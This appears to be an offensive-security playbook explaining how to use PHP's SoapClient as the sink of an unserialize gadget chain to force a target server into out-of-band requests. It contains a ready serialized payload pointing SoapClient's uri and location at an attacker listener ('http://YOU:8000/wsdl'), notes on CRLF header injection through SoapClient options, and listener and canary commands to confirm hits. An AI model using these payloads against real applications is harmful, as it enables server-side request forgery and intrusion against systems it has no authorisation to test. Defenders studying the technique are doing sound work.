# PHP SoapClient — the OOB SSRF gadget hiding inside a POP chain

## The mechanism

`SoapClient` is a built-in PHP class whose `__call`/`__doRequest` fires a
real HTTP request to fetch/use a WSDL. If `SoapClient` is reachable in an
`unserialize` chain — its state (the WSDL URI, options) is yours — a magic
method call becomes a server-side request. It's the cheapest PHP OOB
confirm because it needs NO external library.

## Why it's the standard OOB confirm

- `SoapClient` is in `php-soap` — present on most PHP installs
- it's a JDK/URLDNS-equivalent — a URL-fetch trigger with no deps
- a `__call`/`__doRequest` on it = the server fetches your URL — the callback
- it sits at the END of a POP chain as a `call_user_func`/`->method()` pivot

## The chain shape — pivot into SoapClient

```php
// entry → trampoline → SoapClient->method() → the URL fetch
// e.g. a class whose __destruct calls $handler->method():
$soap = unserialize-blob-of:  SoapClient with uri => http://YOU/wsdl
// then the chain's __call on it fires __doRequest → fetches the WSDL
```

```
O:6:"Logger":1:{s:10:"\0*\0handler";O:10:"SoapClient":2:{s:3:"uri";s:22:"http://YOU:8000/wsdl";s:8:"location";s:22:"http://YOU:8000/wsdl";}}
```

## The useful `SoapClient` props

```php
// the deserialized state you control:
uri         → the WSDL URL — the fetch target
location    → the SOAP endpoint — where requests go
options     → 'trace','user_agent','proxy_host','login','password',...
```

`uri`+`location` are the fetch URL — set them to your listener. `proxy_*`
+ `login`/`password` can redirect the fetch through creds or a proxy —
headers are partially controllable (CRLF-injection surface in some versions).

## The triggering call — what makes it fetch

`__call`/`__doRequest`/`__soapCall`/`__getFunctions` — ANY method the chain
invokes on the SoapClient hits `__call` → `__doRequest` → the fetch. The
trampoline's method name doesn't matter — `SoapClient::__call` intercepts
every unknown method.

```php
// any of these on a SoapClient instance → the WSDL/endpoint fetch:
$obj->nonexistent()          → __call → __doRequest → fetch
$obj->__getFunctions()        → fetches the WSDL
$obj->__doRequest(...)        → the request
```

## CRLF inside the URL/headers — the bonus bug

`SoapClient`'s `location`/`uri`/`user_agent`/`login`/`password`/`proxy_*`
options reach HTTP headers — a `\r\n` in `location`/`user_agent` injects a
header — request-smuggling/CRLF overlap. PHP <5.x-era SoapClient allows it;
newer versions encode.

## The PHP-version note

- `SoapClient` needs `php-soap` — check for the extension (`class_exists
  ('SoapClient')` in an error, or the `soap` ext in `phpinfo`)
- `__call` triggers on ANY undefined method — the trampoline just calls one
- older PHP has a `__doRequest` path that fetches even on a null call

## The detect — the OOB hit

```bash
python3 tools/web/oob_listener.py serve --port 8000 --log hits.jsonl
python3 tools/web/oob_listener.py canary --base http://YOU:8000 --name soap1
# → hit = SoapClient fetched the WSDL — the chain reached __doRequest
# → the listener log shows the URL + the app's User-Agent
```

## The "it's not a POP entry" note

`SoapClient` itself has no `__wakeup`/`__destruct` — it doesn't FIRE on
unserialize. It's the SINK at the end of a chain — another class's magic
method must CALL a method on it. It's the target class, not the entry class.

## Falsifiers

- `php-soap` not installed → `class not found` on `SoapClient`
- the chain's trampoline can't reach a method call on the object
- the URL the chain fetches is fixed, not prop-controlled
- egress fully blocked → the fetch can't reach you (but it still proves the
  deserializer ran if you see the connect attempt in a log)

## Output to record

- The chain's trampoline that calls the SoapClient method
- The OOB-listener log line the fetch produced
- The `canary --name` tag matching the hit to the probe
